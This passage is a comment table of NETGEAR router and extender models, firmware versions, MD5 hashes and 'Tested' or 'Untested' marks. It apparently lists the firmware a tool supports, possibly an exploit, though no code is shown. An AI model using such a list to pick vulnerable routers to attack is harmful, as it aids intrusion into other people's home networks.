#   R6400       V1.0.1.52_1.0.36      2d9bdc83337eaebd5b0764e4dfbf6615  Untested
#   R6400       V1.0.1.50_1.0.35      82c8c7958cc51705e0388d17494a7e5b  Untested
#   R6400       V1.0.1.46_1.0.32      792259674ad727503af277ec1dfaacb1  Untested
#   R6400       V1.0.1.44_1.0.31      eeab43c47589c596a25b8da901c0b986  Tested
#   R6400       V1.0.1.42_1.0.28      f88a6ffd8b267951c1e3acf49041cb29  Untested
#   R6400       V1.0.1.36_1.0.25      fbaea94679a9e93f317fa887b835aacd  Tested
#   R6400       V1.0.1.34_1.0.24      d272b88f46a0acd88449250bf7cb40d9  Untested
#   R6400       V1.0.1.26_1.0.19      5c52c2422597a786afe6899afa51fe3f  Untested
#   R6400       V1.0.1.24_1.0.18      19e6711c51642615cd8da895bcb4f154  Untested
#   R6400       V1.0.1.22_1.0.17      d790c8858dd1968bb0cbac73e7ae049b  Untested
#   R6400       V1.0.1.20_1.0.16      d8620afd06eb83c41350f490de6792df  Tested
#   R6400       V1.0.1.18_1.0.15      e98f59224c11fe7b7adbe4d35a2ae024  Untested
#   R6400       V1.0.1.12_1.0.11      7541ede9feaa32df1e20b852f7a230a5  Untested
#   R6400       V1.0.1.6_1.0.4        83ba47279692268739d82a7edfafc1ec  Untested
#   R6400       V1.0.0.26_1.0.14      5be5fe81595674f0a11a65982a8cf7e3  Untested
#   R6400       V1.0.0.24_1.0.13      aa8531c26e10e4e4e612ea4a3df3f7c6  Untested
#   R6400       V1.0.0.20_1.0.11      f320cf859f20f3faab341b47d570740e  Untested
#   R6400       V1.0.0.14_1.0.8       b66455bd7c21a54682e9987fa662ec35  Untested
#   R6400v2     V1.0.4.84_10.0.58     25c0a4081adf5ff142074fd0d8014ac7  Untested
#   R6400v2     V1.0.4.82_10.0.57     234bdb2fe2d358fa4dbce974ca98d8b0  Untested
#   R6400v2     V1.0.4.78_10.0.55     c7dad31adf2562df42d1b020a56ab630  Untested
#   R6400v2     V1.0.3.66_10.0.50     585dedb8fa86d0d8f6a4efb5591c501d  Untested
#   R6400v2     V1.0.2.66_10.0.48     43d36ce5d516a6121adff6aec8f5a7c7  Untested
#   R6400v2     V1.0.2.62_10.0.46     11aa8cceef3708d911cb4b2919fe396a  Untested
#   R6400v2     V1.0.2.60_10.0.44     4e73683b8cfaaadac6b0c9a2b5fe81d1  Untested
#   R6400v2     V1.0.2.56_10.0.42     c0bd191a5c021607b9c4627734943cd5  Untested
#   R6400v2     V1.0.2.52_1.0.39      73e31c6da5db634d58245169c430ab4e  Untested
#   R6400v2     V1.0.2.50_1.0.38      d3a9a3d8d1cad0836ceb36c50eda2dbb  Untested
#   R6400v2     V1.0.2.46_1.0.36      5ac0b9b42dc3be8f1fe67a4ea50d766e  Untested
#   R6400v2     V1.0.2.44_1.0.35      a29a8290d6f451aa23db9cc132c8bb13  Untested
#   R6400v2     V1.0.2.34_1.0.22      d609534b475f848709b5957bf65853d7  Untested
#   R6400v2     V1.0.2.32_1.0.20      791b103a3798b00e844007520f0ef10b  Untested
#   R6400v2     V1.0.2.14_1.0.7       f707aab369ee4a0358084f8732df4427  Untested
#   R6700       V1.0.2.8_10.0.53      0aa39d2e46c1597da2ef91894bb016e2  Untested
#   R6700       V1.0.2.6_10.0.52      0a9041cc202ca71633f6fd5b15d621ef  Untested
#   R6700       V1.0.1.48_10.0.46     f9856946d2b2d60ac72149f3db34bd18  Untested
#   R6700       V1.0.1.46_10.0.45     60fbfa7d196f3262b1d5c7f2388815fb  Untested
#   R6700       V1.0.1.44_10.0.44     b034da1c05b9e0e76d980808457b9f7b  Untested
#   R6700       V1.0.1.36_10.0.40     361b453523cd68d1d50f9be9e6affab4  Untested
#   R6700       V1.0.1.32_10.0.38     346a257676872b5322986dd755a26ba0  Untested
#   R6700       V1.0.1.26_10.0.35     d868075504004b20d7788c788a5180b2  Untested
#   R6700       V1.0.1.22_10.0.33     66bc7b05ac8c546f7f896a9829f01adf  Untested
#   R6700       V1.0.1.20_10.0.32     43ae34c752dacb9f842947165115568d  Untested
#   R6700       V1.0.1.16_10.0.30     56e60ce42c6b4eb204e5c192a3cc7021  Untested
#   R6700       V1.0.1.14_10.0.29     1f8d3fbcc6e12424692ad371fd895b34  Untested
#   R6700       V1.0.0.26_10.0.26     e57c70b7d76855b8df473a8ecc8d4b2c  Untested
#   R6700       V1.0.0.24_10.0.18     0a63a44df72c4ad9479df8552c9bdf96  Untested
#   R6700       V1.0.0.2_1.0.1        9990354d0687c8cde7f42aa025eec7c2  Untested
#   R6700v3     V1.0.4.84_10.0.58     25c0a4081adf5ff142074fd0d8014ac7  Untested
#   R6700v3     V1.0.4.82_10.0.57     234bdb2fe2d358fa4dbce974ca98d8b0  Untested
#   R6700v3     V1.0.4.78_10.0.55     c7dad31adf2562df42d1b020a56ab630  Untested
#   R6700v3     V1.0.3.66_10.0.50     585dedb8fa86d0d8f6a4efb5591c501d  Untested
#   R6700v3     V1.0.2.66_10.0.48     43d36ce5d516a6121adff6aec8f5a7c7  Untested
#   R6700v3     V1.0.2.62_10.0.46     11aa8cceef3708d911cb4b2919fe396a  Untested
#   R6700v3     V1.0.2.60_10.0.44     4e73683b8cfaaadac6b0c9a2b5fe81d1  Untested
#   R6700v3     V1.0.2.56_10.0.42     c0bd191a5c021607b9c4627734943cd5  Untested
#   R6700v3     V1.0.2.52_1.0.39      73e31c6da5db634d58245169c430ab4e  Untested
#   R6900       V1.0.2.8_10.0.38      d81bc8a57b9430527fb706d516eed382  Untested
#   R6900       V1.0.2.6_10.0.37      b87b38710ef5977179d503bc9bf66c13  Untested
#   R6900       V1.0.2.4_10.0.35      9e79f7b6256d96609a7a461829d8248e  Untested
#   R6900       V1.0.1.48_10.0.30     8784f761ecd1b354649f6cf8c2c5b99f  Untested
#   R6900       V1.0.1.46_10.0.29     37400b051afec889ab58b056d5bb3c86  Untested
#   R6900       V1.0.1.44_10.0.28     9784f4edd86b697c94acde2276179de3  Untested
#   R6900       V1.0.1.34_1.0.24      d01623ce7b7493963aa159a60e07fe19  Untested
#   R6900       V1.0.1.28_1.0.21      541352d81d7ce6c70707f858e03d3ad3  Untested
#   R6900       V1.0.1.26_1.0.20      acbcba2cf243924e324e07b625d8f6b9  Untested
#   R6900       V1.0.1.22_1.0.18      01c44643eb33073d5e6ad845227f798a  Untested
#   R6900       V1.0.1.20_1.0.17      8c26c3b7f0f24f98acda07da2ccad65e  Untested
#   R6900       V1.0.1.16_1.0.15      7e599f7ebee500d6f085f531a6f1e934  Untested
#   R6900       V1.0.1.14_1.0.14      de1af2d6fdc38f2efa7dc19f71110b77  Untested
#   R6900       V1.0.0.4_1.0.10       f7cdbfd458403617025681b9fd545df8  Untested
#   R6900       V1.0.0.2_1.0.2        4f1253f17d5892a6ad139b17f8122d95  Untested
#   R6900P      V1.3.1.64_10.1.36     73230b02c8371d16933b86caea3406c8  Untested
#   R6900P      V1.3.1.44_10.1.23     c94a81a643471975801c1f65f30fa09e  Untested
#   R6900P      V1.3.1.26_10.1.3      350a0ce80d8448f89821c84c5c24e77a  Untested
#   R6900P      V1.3.0.20_10.1.1      57f68b9174f20c1cb9076e893f7c7e3e  Untested
#   R6900P      V1.3.0.8_1.0.93       72df20b0f868e8fb896dc1c89b2f7c9a  Untested
#   R6900P      V1.2.0.22_1.0.78      89b5c3b5f8f75715b01eca80d8423adc  Untested
#   R6900P      V1.0.1.14_1.0.59      8731b6fcf8aa73adec7175c4fa30d623  Untested
#   R6900P      V1.0.0.58_1.0.50      d04818c010e0bcfeef910cb8c0bd217e  Untested
#   R6900P      V1.0.0.46_1.0.30      d2f1f602054a8475aebd563d9373c59c  Untested
#   R7000       V1.0.11.100_10.2.100  f39d1a3be29d903a5de78a876a92f247  Tested
#   R7000       V1.0.9.88_10.2.88     1e4a56c9fa6a0b1ddb12c93260aa86b9  Tested
#   R7000       V1.0.9.64_10.2.64     2545e4d62fe606c9235301b13fe51c4a  Tested
#   R7000       V1.0.9.60_10.2.60     0c1face67db74dae80477937e375c90f  Tested
#   R7000       V1.0.9.42_10.2.44     9db15cdabcb182c5a8c352f4d62240aa  Tested
#   R7000       V1.0.9.34_10.2.36     0130c6ef44df28825c34998ec1ed9d28  Tested
#   R7000       V1.0.9.32_10.2.34     d63cc30511ec16eb22aea2ad4536c482  Untested
#   R7000       V1.0.9.28_10.2.32     65fdddb6075d231981d0b0b0b173b957  Untested
#   R7000       V1.0.9.26_10.2.31     e7eb90b86b4cf80fc498a3a2a1cde4b6  Tested
#   R7000       V1.0.9.18_1.2.27      62f58a3b03d2ffe4da6def29dc57fd62  Tested
#   R7000       V1.0.9.14_1.2.25      933a68fd113502dbe5ee5eda56d76c4d  Tested
#   R7000       V1.0.9.12_1.2.23      0815e4c5d8bf72f3bc8f8a7c3c5151a5  Tested
#   R7000       V1.0.9.10_1.2.21      89caf1296fb771f6f710fdaa11b1eee4  Tested
#   R7000       V1.0.9.6_1.2.19       5f52c024607204abbe68350fe3da9ff0  Tested
#   R7000       V1.0.8.34_1.2.15      f9472bcb1eea80197f98bd33006666a3  Tested
#   R7000       V1.0.7.12_1.2.5       20358acc1e6eff39e2d6846e76b24cd8  Untested
#   R7000       V1.0.7.10_1.2.3       c555f18db9afc19489e7e986f143d485  Untested
#   R7000       V1.0.7.6_1.1.99       0a49104751389366034a7c88f32197b3  Untested
#   R7000       V1.0.7.2_1.1.93       6d7d94848a91a3e22ff1654411ba09ae  Untested
#   R7000       V1.0.5.70_1.1.91      05a4bf0348e03857c7d37910f02f4afe  Untested
#   R7000       V1.0.5.64_1.1.88      edfa804fcb57d842ae1ea53544fc790d  Untested
#   R7000       V1.0.4.30_1.1.67      c62491d7b5f5ac6a41d4f25d7a4896e2  Untested
#   R7000       V1.0.4.28_1.1.64      60f6118cc800e96ec4156738485a6061  Untested
#   R7000       V1.0.4.18_1.1.52      ee82a3fcaf278597ebeb6bd6a7a436ec  Untested
#   R7000       V1.0.3.80_1.1.38      6575261b06aa8a64242f02461530a0fc  Untested
#   R7000       V1.0.3.68_1.1.31      d62937f144cbe3cc259d33c70adf1f65  Untested
#   R7000       V1.0.3.60_1.1.27      f36cf1c461b50883d5c001f66f06c324  Untested
#   R7000       V1.0.3.56_1.1.25      2ad107f27a2d3fa6db7787594a5718cd  Untested
#   R7000       V1.0.3.24_1.1.20      25d86a5a33cd447aa35120e4fc97ae8e  Untested
#   R7000       V1.0.2.194_1.0.15     26fb65524fec001d6ff8cc723d0e863a  Untested
#   R7000       V1.0.2.164_1.0.15     b4b75cd7c7fc736ca8d195de6954cdb0  Untested
#   R7000       V1.0.1.22_1.0.15      1e7fbdb154328552e6ae21e106b79d71  Untested
#   R7000       V1.0.0.96_1.0.15      2e25aedb619a9e5520bf8ea9a25d06ac  Untested
#   R7000P      V1.3.1.64_10.1.36     73230b02c8371d16933b86caea3406c8  Untested
#   R7000P      V1.3.1.44_10.1.23     c94a81a643471975801c1f65f30fa09e  Untested
#   R7000P      V1.3.1.26_10.1.3      350a0ce80d8448f89821c84c5c24e77a  Untested
#   R7000P      V1.3.0.20_10.1.1      57f68b9174f20c1cb9076e893f7c7e3e  Untested
#   R7000P      V1.3.0.8_1.0.93       72df20b0f868e8fb896dc1c89b2f7c9a  Untested
#   R7000P      V1.2.0.22_1.0.78      89b5c3b5f8f75715b01eca80d8423adc  Untested
#   R7000P      V1.0.1.14_1.0.59      8731b6fcf8aa73adec7175c4fa30d623  Untested
#   R7000P      V1.0.0.58_1.0.50      d04818c010e0bcfeef910cb8c0bd217e  Untested
#   R7000P      V1.0.0.56_1.0.45      e9350d724b176c752f1854d0c93d6197  Untested
#   R7000P      V1.0.0.50_1.0.35      02b57178cbc3c931d3f260a544429481  Untested
#   R7000P      V1.0.0.46_1.0.30      d2f1f602054a8475aebd563d9373c59c  Untested
#   R7000P      V1.0.0.44_1.0.27      fa0eee5e0992621c67e3e2ba5aa00515  Untested
#   R7100LG     V1.0.0.52_1.0.6       1c8d51be270d926fae37ccb870eb1e1a  Untested
#   R7100LG     V1.0.0.50_1.0.6       1d7ef2375f5d48946c00c256c68d2c7e  Untested
#   R7100LG     V1.0.0.48_1.0.6       114fd13cefdf17588004e13240b8e1bf  Untested
#   R7100LG     V1.0.0.46_1.0.6       f9debfe64d27d0a4e96e7b6a9108363b  Untested
#   R7100LG     V1.0.0.42_1.0.6       dcb553dfd489154862ac74eba99e7497  Untested
#   R7100LG     V1.0.0.40_1.0.6       6bf2fa0bbd5afd33358cf5753477907b  Untested
#   R7100LG     V1.0.0.38_1.0.6       ee79ad50639af3c4fff83e1638223dff  Untested
#   R7100LG     V1.0.0.36_1.0.6       1c05d9c779fce01aa42859181382340b  Untested
#   R7100LG     V1.0.0.34_1.0.6       45fc097ce307749679c46d77cde5a6aa  Untested
#   R7100LG     V1.0.0.32_1.0.6       b6adb8bc5262870940b410634305d18b  Untested
#   R7100LG     V1.0.0.30_1.0.6       fb13dc96f7513d2eaef39966b0245c7b  Untested
#   R7100LG     V1.0.0.28_1.0.6       11f8dd187ef5b5bab4976d9292d129fc  Untested
#   R7100LG     V1.0.0.24_1.0.6       26732e7cac019aadb0513625017f384a  Untested
#   R7300       V1.0.0.74_1.0.29      505ed4f38c41eee6d44f7689f50be393  Untested
#   R7300       V1.0.0.70_1.0.25      ae3e7269a0b9d57c970341bcb0429542  Untested
#   R7300       V1.0.0.68_1.0.24      2bcde5639accf598265b7177d782476d  Untested
#   R7300       V1.0.0.62_1.0.21      0fe64444a5449fbc047200473f0f9403  Untested
#   R7300       V1.0.0.60_1.0.20      13d0cabc4464b992e1df78eef6f3961f  Untested
#   R7300       V1.0.0.56_1.0.18      ebbbdf612c711973bbf8794c44a95970  Untested
#   R7300       V1.0.0.54_1.0.17      5aa834b74be6bf16397c791c80c15146  Untested
#   R7300       V1.0.0.52_1.0.16      95419377446f8733fa675c890ec5f894  Untested
#   R7300       V1.0.0.46_1.0.13      7628870b9f553a2e10768f69756a581d  Untested
#   R7300       V1.0.0.44_1.0.12      83b93e33bfc09a30668aa0fdd23e2854  Untested
#   R7300       V1.0.0.32_1.0.6       fcef0ba19d673f34ccef4dc91dc4fa05  Untested
#   R7300       V1.0.0.26_1.0.6       92cff1f3477af90d8596377839e2eec5  Untested
#   R7850       V1.0.5.48_10.0.4      086770d1439357f850a3112ae8819141  Untested
#   R7850       V1.0.4.46_10.0.2      0b0d439985567721303ce85429f9f1fb  Untested
#   R7850       V1.0.4.42_10.0.1      7154f14e8e52992364b9a46454280843  Untested
#   R7900       V1.0.4.22_10.0.44     3068215ef9fae0f5b91f423cf298b551  Untested
#   R7900       V1.0.3.18_10.0.42     b9648a3331fe0bc714086aa465407027  Untested
#   R7900       V1.0.3.10_10.0.38     9f36b5152658c5fab9524a1d5aca196c  Untested
#   R7900       V1.0.3.8_10.0.37      f7f345699b491db79d7ce2b13c838941  Untested
#   R7900       V1.0.2.16_10.0.32     6ea7c6925906967070fbb149a66a4f06  Untested
#   R7900       V1.0.2.10_10.0.29     644585c5d3509fe14d52387e1a8bb7c8  Untested
#   R7900       V1.0.1.26_10.0.23     2ce02ded670becb1ddf5f23c883d81ee  Untested
#   R7900       V1.0.1.18_10.0.20     6f9af2c3b682c45793dcf06788603160  Untested
#   R7900       V1.0.1.12_10.0.17     44a17c8063f2750fb13bb47bc3cd570c  Untested
#   R7900       V1.0.1.8_10.0.14      66c1cbf908e9d665ac80aaf2a03c4d8f  Untested
#   R7900       V1.0.1.4_10.0.12      6d1186a3d281608fc83936e6c5961145  Untested
#   R7900       V1.0.0.10_10.0.7      46ec7fc4c5cdb9c093ff3bfdb4c8075d  Untested
#   R7900       V1.0.0.8_10.0.5       72b987220f836ba90ba96fc8f3c3e6b8  Untested
#   R7900       V1.0.0.6_10.0.4       255ef90a187d7faf01afa62aa2e16844  Untested
#   R7900       V1.0.0.2_10.0.1       7b6bd468b060ac4fb17084c20898caa4  Untested
#   R8000       V1.0.4.46_10.1.63     da80add1588ea779156ec23b58421a0e  Untested
#   R8000       V1.0.4.28_10.1.54     a93e7d1ca961c5d381c1c93b8f85168b  Untested
#   R8000       V1.0.4.18_10.1.49     45d86327a2dbbad50f65d04480bb91fd  Untested
#   R8000       V1.0.4.12_10.1.46     917d43c1bf1805db4d52ed37d360340f  Untested
#   R8000       V1.0.4.4_1.1.42       bb306a4634a9f38ef6b44bfb699c64d7  Untested
#   R8000       V1.0.4.2_1.1.41       a3ec0994398d09e774fa4f149eece45b  Untested
#   R8000       V1.0.3.54_1.1.37      e2e236432b7e215af3d410d3fd1e3777  Untested
#   R8000       V1.0.3.48_1.1.33      8bf3b8f6e1ee371975a1811174a5fe87  Untested
#   R8000       V1.0.3.46_1.1.32      9020713be39ebf9c232ffc0efb02c8fe  Untested
#   R8000       V1.0.3.36_1.1.25      533e646304c2afa4f626f7f4c7aa404c  Untested
#   R8000       V1.0.3.32_1.1.21      02dcbb51aea55ff912a28a24f6b9f78b  Untested
#   R8000       V1.0.3.26_1.1.18      e13536f8d86441eae991067c25d8e22f  Untested
#   R8000       V1.0.3.4_1.1.2        6de885748d6d20f6b5d8fce7112e8563  Untested
#   R8000       V1.0.2.46_1.0.97      5b6484ebe4dc70c4f6e3e2068d999efb  Untested
#   R8000       V1.0.2.44_1.0.96      6f83c53910438a665cb1077dbcd3365e  Untested
#   R8000       V1.0.1.16_1.0.74      7d670355315b039002a8cbbb80420b4f  Untested
#   R8000       V1.0.0.110_1.0.70     ef0078e8e19027cdf9ea19de0c933042  Untested
#   R8000       V1.0.0.108_1.0.62     6b3476409b804505b6d50ad6bc7b1225  Untested
#   R8000       V1.0.0.102_1.0.45     a01fcda6b67f06fe4c8c89beea8a1346  Untested
#   R8000       V1.0.0.100_1.0.44     49c84460fe2f2c8acde4c2a5e644b1c8  Untested
#   R8000       V1.0.0.90_1.0.39      3f1ec00fbd5b17bb494a7a7b407b0c4e  Untested
#   R8000       V1.0.0.76_1.0.32      0d13323ba9174c355b892f5fdc8ad1f4  Untested
#   R8000       V1.0.0.74_1.0.31      2ba89ed0267f17111410325af7443e9c  Untested
#   R8000       V1.0.0.68_1.0.27      444b9d3c9f7c4fd57b88adcc204e5786  Untested
#   R8000       V1.0.0.46_1.0.17      00a3ca9d640835bc1522bf778316d085  Untested
#   R8300       V1.0.2.130_1.0.99     6e66d0f53dabb26b63b3c51c60e31d29  Tested
#   R8300       V1.0.2.128_1.0.97     a1976abe6cfe426c82fd3e77910ae833  Tested
#   R8300       V1.0.2.122_1.0.94     9158cf385252ea8803c593a61c25d6b4  Untested
#   R8300       V1.0.2.116_1.0.90     379b3d60f766f148f6edd781207021a4  Untested
#   R8300       V1.0.2.106_1.0.85     e07b4ac548845360376351088bdbe025  Untested
#   R8300       V1.0.2.100_1.0.82     aee8499b7a27150255651be82f68d292  Untested
#   R8300       V1.0.2.94_1.0.79      bcfbef70672ec7f5eb191eb362d91827  Untested
#   R8300       V1.0.2.86_1.0.75      de6b48ac7b27dbe36b3ab787dfda3c69  Untested
#   R8300       V1.0.2.80_1.0.71      fc1acfbaeebc1f377b44597371b0d250  Untested
#   R8300       V1.0.2.48_1.0.52      e851c828e338b0877257dd1944f48f95  Untested
#   R8500       V1.0.2.130_1.0.99     6e66d0f53dabb26b63b3c51c60e31d29  Untested
#   R8500       V1.0.2.128_1.0.97     a1976abe6cfe426c82fd3e77910ae833  Untested
#   R8500       V1.0.2.122_1.0.94     9158cf385252ea8803c593a61c25d6b4  Untested
#   R8500       V1.0.2.116_1.0.90     379b3d60f766f148f6edd781207021a4  Untested
#   R8500       V1.0.2.106_1.0.85     e07b4ac548845360376351088bdbe025  Untested
#   R8500       V1.0.2.100_1.0.82     aee8499b7a27150255651be82f68d292  Untested
#   R8500       V1.0.2.94_1.0.79      bcfbef70672ec7f5eb191eb362d91827  Untested
#   R8500       V1.0.2.86_1.0.75      de6b48ac7b27dbe36b3ab787dfda3c69  Untested
#   R8500       V1.0.2.80_1.0.71      fc1acfbaeebc1f377b44597371b0d250  Untested
#   R8500       V1.0.2.64_1.0.62      5b4523865713dac322bd857130609ad2  Untested
#   R8500       V1.0.2.54_1.0.56      24f96de9380f9de69e12f89d4fa75819  Untested
#   R8500       V1.0.2.30_1.0.43      86b0d0a568ac5c96a76caff6fd58aa61  Untested
#   R8500       V1.0.2.26_1.0.41      db2cb85f4ebe32a00ed0f363857296bc  Untested
#   R8500       V1.0.0.56_1.0.28      7ce6e1dc960c18753db2d1e485b89b06  Untested
#   R8500       V1.0.0.52_1.0.26      3e38a40d46ab92e4051c75485d1905c2  Untested
#   R8500       V1.0.0.42_1.0.23      46bede5c9402a454eb1ae575e7a360e4  Untested
#   R8500       V1.0.0.28_1.0.15      94090fe2e24ba7306a2f31633adc9fe7  Tested
#   RS400       V1.5.0.34_10.0.33     06d0d64069c01a8097cd872749976d05  Untested
#   WGR614v8    V1.2.10_21.0.52       614f89302975403d496b4a0b518aea8a  Untested
#   WGR614v8    V1.2.10_21.0.52NA     101384d94d7952a544fa2e62ca73e109  Untested
#   WGR614v8    V1.1.24_14.0.43       f43f802a97701767f8fa09f1eb0618c6  Untested
#   WGR614v8    V1.1.24_14.0.43NA     95a6f676f56eac0bb8b1eebbd07218ac  Untested
#   WGR614v8    V1.1.2_1.0.23         071d4113f52c9b21b3c910bb28bacb7d  Untested
#   WGR614v8    V1.1.2_1.0.23NA       bd2fb25f2771d63615a8f3b97c969a0e  Untested
#   WGR614v8    V1.1.11_6.0.36        607bb6c99bf0133f0d01fa514801b849  Untested
#   WGR614v8    V1.1.11_6.0.36NA      241628d09640f984584744fb017683c3  Untested
#   WGR614v8    V1.1.1_1.0.20NA       b6eb6eae0124e9cd22d61adcc38c999a  Untested
#   WGR614v8    V1.1.20_7.0.37        a3c36fcddb7655a94363cc3b7918496a  Untested
#   WGR614v8    V1.1.20_7.0.37NA      ed0152c3f9cb8bd31c9c166e20cafc4b  Untested
#   WGR614v9    V1.2.32_43.0.46       fa1c55ad1567fd849ef751d291b892de  Untested
#   WGR614v9    V1.2.32_43.0.46NA     365476604a6a3d41ea175f10c3dde764  Tested
#   WGR614v9    V1.2.30_41.0.44       7118b22c86f91adc51bcf1cb1d6adf6c  Untested
#   WGR614v9    V1.2.30_41.0.44NA     5aa4fb6075c995ac8ed73872785c78ce  Untested
#   WGR614v9    V1.2.24_37.0.35       5b911dfea21d8db82724810e2a9158bd  Untested
#   WGR614v9    V1.2.24_37.0.35NA     82e743338a1e9ef765dc4b3e37fafd9d  Untested
#   WGR614v9    V1.2.6_18.0.17        62d24aa8be617fd336dea0debb655ae1  Untested
#   WGR614v9    V1.2.6_18.0.17NA      523084eb4010f48a0e707a4028a1fe1d  Untested
#   WGR614v9    V1.2.2_14.0.13        e6a2dbc9c94544c7eed21b237ccfd24f  Untested
#   WGR614v9    V1.2.2_14.0.13NA      2d8d6c91da01e286af941d53b0941cd8  Untested
#   WGR614v9    V1.0.18_8.0.9PT       64676efe72f6af307b828271e6204fc2  Untested
#   WGR614v9    V1.0.18_8.0.9NA       c2ef52172f626dd54516748218fd86fc  Untested
#   WGR614v9    V1.0.15_4.0.3         77789a77994b2401784b1401d73d0b9d  Untested
#   WGR614v9    V1.0.15_4.0.3NA       7a8e000d8d49c9e59c4b1679017a34b2  Untested
#   WGR614v9    V1.0.9_1.0.1NA        f254181ba5f01c3a995d2196ae14ee80  Untested
#   WGR614v10   V1.0.2.66_60.0.90     3ba19173b642c36ab3101c2eba76cffe  Untested
#   WGR614v10   V1.0.2.66_60.0.90NA   0f59b6e38db90d94d2d13b768a3220a9  Tested
#   WGR614v10   V1.0.2.60_60.0.85     1d60611c5c1625d080f3e10e610c2d5f  Untested
#   WGR614v10   V1.0.2.60_60.0.85NA   a025c0436b77becfe914b232bf52ef25  Untested
#   WGR614v10   V1.0.2.58_60.0.84NA   f80a3eb6d9210cb0de2198779f497193  Untested
#   WGR614v10   V1.0.2.54_60.0.82     ab7a9cc1b054ab8ca2109437f3496f52  Untested
#   WGR614v10   V1.0.2.54_60.0.82NA   2a458ba9762df0e91aeb7c38d3eb7e23  Untested
#   WGR614v10   V1.0.2.26_51.0.59     40d158ee9d77db8630f6404e11ae03f9  Untested
#   WGR614v10   V1.0.2.26_51.0.59NA   2e31d2fd814b3bdfe3b0e3f20843d1b9  Untested
#   WGR614v10   V1.0.2.18_47.0.52     73aab18a9fc0035ff8c65d444cab5549  Untested
#   WGR614v10   V1.0.2.18_47.0.52NA   d4d624d349e6f7da73043d71f44a57d5  Untested
#   WGT624v4    V2.0.13_2.0.15NA      80fefa297112135ddd81cf1f60f3c751  Tested
#   WGT624v4    V2.0.13_2.0.14        cb4f0a9fc4135b33a9cf560c95c97f51  Untested
#   WGT624v4    V2.0.13_2.0.14NA      f5b5be2c84b1aef8ca53df5fceab272e  Untested
#   WGT624v4    V2.0.12_2.0.12        fed810d3dc976e06588e6876f96f9259  Untested
#   WGT624v4    V2.0.12_2.0.12NA      60a3a0f205a5716818dbdf1975fbb07b  Tested
#   WGT624v4    V2.0.6_2.0.6NA        f96fbceb5289a65edd92f978ee706339  Untested
#   WN2500RP    V1.0.0.30_1.0.58      07465158c20dba3b49c79d2ad1b9c84a  Untested
#   WN2500RP    V1.0.0.26_1.0.54      96bd8cfd11a618e5a55bd022428782c9  Untested
#   WN2500RP    V1.0.0.24_1.0.53      242e4d920ff5df57c9d65a238c29ce37  Untested
#   WN2500RPv2  V1.0.1.54_1.0.68      14b91d65bae2129cc4b899e720e75703  Untested
#   WN2500RPv2  V1.0.1.50_1.0.64      8b0791af9666590e58209fd7e5a16b27  Untested
#   WN2500RPv2  V1.0.1.46_1.0.60      b5114bc628d4e9edc10196270d583177  Untested
#   WN2500RPv2  V1.0.1.42_1.0.56      44a31a9fb0bedf6c005091ad494f5351  Untested
#   WN2500RPv2  V1.0.0.30_1.0.41      80ef4b999eca686146b0b04e6d669373  Untested
#   WN3000RP    V1.0.2.64_1.1.86      cb7f3d886a25dc7eb9f986beb54db84a  Tested
#   WN3000RP    V1.0.1.36_1.1.47      df4292954de76be0f27025b9d13ce6bb  Untested
#   WN3000RP    V1.0.1.34_1.1.46      71f56fc6e8094749302f527fe82289a2  Untested
#   WN3000RP    V1.0.1.18_1.1.24      a1c3820bdca75d04162dd7861fb2f86d  Tested
#   WN3000RP    V1.0.0.12_1.0.12      e06626090bdae6ce66cf75ff03808a5e  Untested
#   WN3100RP    V1.0.0.20_1.0.22      7fdba1a377186b9e1998672c2648d79d  Untested
#   WN3100RP    V1.0.0.16_1.0.20      35d8cde0380d205a7fdca505667d85b4  Untested
#   WN3100RP    V1.0.0.14_1.0.19      ae21c356da1b984b489b8aabce19de7b  Untested
#   WN3100RP    V1.0.0.6_1.0.12       f731689ad01cc5505e3891e6919c5a05  Untested
#   WN3500RP    V1.0.0.22_1.0.62      c1674d36c57a5de7933135d59383974e  Untested
#   WN3500RP    V1.0.0.20_1.0.60      65d7a5a699c75333693b2cd396034937  Untested
#   WN3500RP    V1.0.0.18_1.0.59      83df1d146445eb58d09e445cb3249894  Untested
#   WN3500RP    V1.0.0.16_1.0.58      0bbedd6843907c8fbb64770e8b57ac2d  Untested
#   WN3500RP    V1.0.0.14_1.0.54      7cc46c62a531db3dc0fd4780c0f82838  Untested
#   WN3500RP    V1.0.0.12_1.0.49      d6d3eb3f36fa4c2a041903bf7d6fd169  Untested
#   WNCE3001    V1.0.0.50_1.0.35      059ad6dcebb82e6651096da7a08fc78d  Untested
#   WNCE3001    V1.0.0.46_1.0.33      94f01f14cf494c5149f6d7beaa9296d7  Untested
#   WNCE3001    V1.0.0.44_1.0.32      4bbca14fd0f41a8c5cd6871a128e46ac  Untested
#   WNCE3001    V1.0.0.38             619dc850fe460613aaa2c6df53c419d2  Untested
#   WNDR3300    V1.0.45_1.0.45        03d3251057856d6cac4769ab86b066bf  Tested
#   WNDR3300    V1.0.45_1.0.45NA      5d07e4a0ea0a970e89f9396aa62dd607  Tested
#   WNDR3300    V1.0.29_1.0.29        602f96a6fae5e8d7f4309f4d8e08188d  Untested
#   WNDR3300    V1.0.29_1.0.29NA      d6f3cf64ce4af186d4e32b4e6452faf2  Untested
#   WNDR3300    V1.0.27_1.0.27NA      8ec2a57bb32cfc0f037972e7e4de7faf  Untested
#   WNDR3300    V1.0.26_1.0.26        3de6162f831de47f58d9f5333e55b7ab  Untested
#   WNDR3300    V1.0.26_1.0.26NA      748179fe0a96b58999b3a159c3e31723  Untested
#   WNDR3300    V1.0.23_1.0.23NA      3bb5461c1170a5753dfffc3f640acc2b  Untested
#   WNDR3300    V1.0.14               cf637815959405a86d006e2ba1bcfb8d  Untested
#   WNDR3300    V1.0.14NA             3d2ac9332328b0c256e3c733c98f6a52  Tested
#   WNDR3300v2  V1.0.0.26_11.0.26NA   e835e1eee653616ba95499f599b78e5b  Untested
#   WNDR3400    V1.0.0.52_20.0.60     80de163495cc5e58b2c2ff897eec5fd6  Tested
#   WNDR3400    V1.0.0.50_20.0.59     d11430ae71dbae949d2eb2a9630ccf1a  Untested
#   WNDR3400    V1.0.0.38_16.0.48     b8c40a4c5186a3db9ce2a9099147e693  Tested
#   WNDR3400    V1.0.0.34_15.0.42     040b5ffe8176b9c42d96b2099f9b4ce0  Untested
#   WNDR3400v2  V1.0.0.54_1.0.82      9c021309e2c4091fc57df0353e75b549  Tested
#   WNDR3400v2  V1.0.0.52_1.0.81      727e32bd4cb10e0b24d9766fe9a227df  Untested
#   WNDR3400v2  V1.0.0.38_1.0.61      c8e6e4c539f61b3e3eb6ca0539a68858  Untested
#   WNDR3400v2  V1.0.0.34_1.0.52      a88e95d61d2d7ff00009cb1120e85fe5  Untested
